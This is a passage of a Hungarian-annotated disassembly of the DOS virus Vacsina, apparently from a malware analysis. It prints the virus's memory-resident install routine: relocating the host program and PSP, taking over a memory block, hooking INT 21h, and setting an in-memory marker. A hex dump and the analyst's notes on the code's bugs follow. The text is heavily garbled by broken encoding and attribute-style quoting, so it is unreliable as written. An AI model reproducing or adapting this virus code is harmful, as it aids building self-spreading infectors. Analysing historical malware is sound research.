futtat sa="" 03ec="" 8cc8="" *="" mov="" ax,cs="" 03ee="" 8ed8="" mov="" ds,ax="" ;szegmensregiszterek="" be ll¡t sa="" 03f0="" 8ec0="" mov="" es,ax="" 03f2="" 8ed0="" mov="" ss,ax="" 03f4="" 2e="" cs:="" 03f5="" 8b47fb="" mov="" ax,[bx-05]="" ;ere_ax="" (039a)="" 03f8="" 2e="" cs:="" 03f9="" ffa70101="" jmp="" [bx+0101]="" ;ere_2_3="" (04a0)="" hol="" kezd”d”tt="" az="" ered="" eti="" program?="" ;="" ide="" kerl="" a="" vez‚rl‚s="" a="" m r="" lem solt="" v¡rusban="" (03e8-r¢l)="" ;="" az="" eredeti="" programot,="" psp-j‚t,="" mem.le¡r¢="" blokkj t="" is="" h tr‚bb="" mozgatjuk="" 03fd="" be0000="" *="" mov="" si,0000="" ;megj.:="" felesleges="" 0400="" bf0000="" mov="" di,0000="" 0403="" 8bcb="" mov="" cx,bx="" ;bx="039F" 0405="" 81c161fc="" add="" cx,fc61="" ;cx="0000" (eredeti="" program+psp+mem.le="" ¡r¢="" blokk="" hossza)="" 0409="" 8cc2="" mov="" dx,es="" 040b="" 4a="" dec="" dx="" 040c="" 8ec2="" mov="" es,dx="" ;szegmens--,="" mert="" a="" mem.le¡r¢="" blokkot="" is="" m soljuk="" 040e="" 8cda="" mov="" dx,ds="" 0410="" 4a="" dec="" dx="" 0411="" 8eda="" mov="" ds,dx="" 0413="" 03f1="" add="" si,cx="" 0415="" 4e="" dec="" si="" ;visszafel‚="" m solunk="" az‚rt="" kell="" 0416="" 8bfe="" mov="" di,si="" 0418="" fd="" std="" 0419="" f3="" repz="" 041a="" a4="" movsb="" 041b="" fc="" cld="" ;="" h tr‚bbmozgat s="" dokument l sa="" 041c="" 2e="" cs:="" 041d="" 8b9754fc="" mov="" dx,[bx+fc54]="" ;mlb_hossz="4C" virus=""  ltal="" lefoglalt="" m="" em¢riablokk="" hossza="" 0421="" 26="" es:="" 0422="" 29160300="" sub="" [0003],dx="" ;az="" eredeti="" program="" mem.blokkj nak="" cs="" ”kkent‚se="" 0426="" 26="" es:="" 0427="" 8c0e0100="" mov="" [0001],cs="" ;uj="" gazda="" ;="" v¡rus="" visszam sol sa="" a="" szabadd ="" tett="" helyre="" 042b="" bf0000="" mov="" di,0000="" 042e="" 8bf3="" mov="" si,bx="" ;bx="039F" 0430="" 81c651fc="" add="" si,fc51="" ;fff0="" v¡rus="" kezdete="" (mem.le¡r¢="" blokk="" al="" egytt)="" 0434="" b9b604="" mov="" cx,04b6="" 0437="" 1e="" push="" ds="" 0438="" 07="" pop="" es="" ;v¡sszam solunk="" 0439="" 0e="" push="" cs="" 043a="" 1f="" pop="" ds="" ;es="ds" ;="" ds="cs" 043b="" f3="" repz="" 043c="" a4="" movsb="" ;="" egy‚b="" teend”k="" (az="" £j="" psp="" miatt)="" 043d="" 26="" es:="" 043e="" 832e030001="" sub="" word="" ptr="" [0003],+01="" ;a="" mem.le¡r¢="" blokk="" hossz t="" nem="" kell="" s="" z molni!="" 0443="" 53="" push="" bx="" 0444="" 8ccb="" mov="" bx,cs="" 0446="" b450="" mov="" ah,50="" ;set_psp="" (bx)="" 0448="" cd21="" int="" 21="" 044a="" 5b="" pop="" bx="" 044b="" 2e="" cs:="" 044c="" 8c0e3600="" mov="" [0036],cs="" ;psp-n="" bell="" a="" gazda="" mehat roz sa="" 0450="" 2e="" cs:="" 0451="" 8b162c00="" mov="" dx,[002c]="" ;environment="" szegmense="" 0455="" 4a="" dec="" dx="" 0456="" 8ec2="" mov="" es,dx="" ;environment="" mem.le¡r¢="" blokkja="" 0458="" 26="" es:="" 0459="" 8c0e0100="" mov="" [0001],cs="" ;uj="" gazda="" ;="" int="" 21="" lek‚rdez‚se="" ‚s=""  t¡r sa="" 045d="" b82135="" mov="" ax,3521="" ;get_int_vect="" (es:bx)="" 0460="" 53="" push="" bx="" 0461="" cd21="" int="" 21="" 0463="" 36="" ss:="" 0464="" 8c060200="" mov="" [0002],es="" ;ere_int21+2="" 0468="" 36="" ss:="" 0469="" 891e0000="" mov="" [0000],bx="" ;ere_int21="" 046d="" 5b="" pop="" bx="" 046e="" b82125="" mov="" ax,2521="" ;set_int_vect="" (ds:dx)="" 0471="" 8cd2="" mov="" dx,ss="" 0473="" 8eda="" mov="" ds,dx="" 0475="" bac000="" mov="" dx,00c0="" ;00c0-t¢l="" lesz="" az="" int="" 21="" rutin="" 0478="" cd21="" int="" 21="" ;="" "a="" v¡rus="" m r="" a="" mem¢ri ban="" van"="" jelz‚s="" 047a="" b80000="" mov="" ax,0000="" 047d="" 8ec0="" mov="" es,ax="" 047f="" 26="" es:="" 0480="" c706c5007f39="" mov="" word="" ptr="" [00c5],397f;azonos¡t¢="" sz¢="" 0486="" 26="" es:="" 0487="" c606c70005="" mov="" byte="" ptr="" [00c7],05="" ;v¡rus="" verzi¢sz ma="" ;="" dta="" be ll¡t sa="" (rosszul!)="" 048c="" 8cc8="" mov="" ax,cs="" 048e="" 8ed8="" mov="" ds,ax="" 0490="" b41a="" mov="" ah,1a="" ;set_dta_address="" (ds:dx)="" 0492="" ba5000="" mov="" dx,0050="" ;hiba="" !!!="" 0080="" kellene="" 0495="" cd21="" int="" 21="" ;="" az="" eredeti="" program="" futtat s ra="" ugr s="" 0497="" 2e="" cs:="" 0498="" 8b47fb="" mov="" ax,[bx-05]="" ;ere_ax="" (039a)="" megj.:teljesen="" felesle="" ges="" 049b="" e94eff="" jmp="" 03ec="" ;---------------------------------------------------------------="" ;="" a="" file="" utols¢="" 8="" byteja="" tartalmazza="" a="" fontos="" inform ci¢kat="" ;---------------------------------------------------------------="" 049e="" ere_hossz="" dw="" ;a="" file="" eredeti="" hossza="" 04a0="" ere_2_3="" dw="" ;a="" file="" eredeti="" 2.,3.="" byteja+0103="" 04a2="" azonosito="" dw="" 7af4="" ;azonos¡t¢sz¢.="" ez="" alapj n="" ismeri="" fel="" a="" fert”z‚="" st="" 04a4="" verzioszam="" db="" 5="" ;v¡rus="" verzi¢sz ma="" 04a5="" ere_1="" db="" 0="" ;m‚g="" nem="" haszn lt="" (az="" els”="" byte="" mindig="" e9)="" v¡rus="" elej‚nek="" hexa="" dump-ja:="" cs-1:0000="" 4d="" 07="" 00="" 4b="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" m..k............="" cs-1:0010="" 72="" 0e="" ae="" 0f="" 56="" 05="" 20="" 0d-20="" 00="" 05="" 00="" 03="" 01="" cd="" 21="" r...v.="" .="" ......!="" cs-1:0020="" b4="" 00="" cd="" 20="" 00="" 56="" 41="" 43-53="" 49="" 4e="" 41="" 20="" 20="" 20="" 20="" ...="" .vacsina="" cs-1:0030="" 00="" 00="" 80="" 00="" 00="" 00="" 00="" 00-7c="" 11="" 37="" a8="" 00="" 40="" c2="" 00="" ........|.7..@..="" cs-1:0040="" 46="" 0a="" 00="" 00="" 00="" 00="" 00="" 00-00="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" f........="" cs-1:0050="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20-20="" 20="" 20="" 20="" 20="" e8="" 00="" 00="" ...="" megjegyz‚sek:="" -="" a="" file="" eredeti="" idej‚t="" nem="" k‚redezi="" le,="" ‚s="" nem=""  ll¡tja="" vissza.="" -="" dta-t="" rosszul=""  ll¡tja="" be.="" ez="" a="" gyermekbetegs‚g="" a="" k‚s”bbi="" verzi¢kban="" is="" megmara="" dt.="" -="" rdekes,="" hogy="" az="" exe="" k¢dj t="" az="" 5a4d-t="" itt="" csak="" ¡gy="" haszn lja,="" m¡g="" a="" k‚s”bbi="" ve="" rzi¢k="" a="" 4d5a-t="" is="" haszn lj k.="" -="" exe-k="" com-m ="" alak¡t sa="" ut n="" nem="" tudom,="" hogy="" mi‚rt="" nem="" mindj rt="" a="" com="" megfert”z="" ‚se="" r‚szre="" ugrik.="" -="" j¢p r="" felesleges="" utas¡t s="" van="" a="" k¢dban,="" ami="" m‚g="" a="" k‚s”bbi="" verzi¢kban="" is="" megmar="" adt.="" -="" a="" v¡rus="" eg‚sz="" mk”d‚se="" arra="" utal,="" hogy="" csak="" kis‚rletez‚sr”l="" van="" sz¢.="">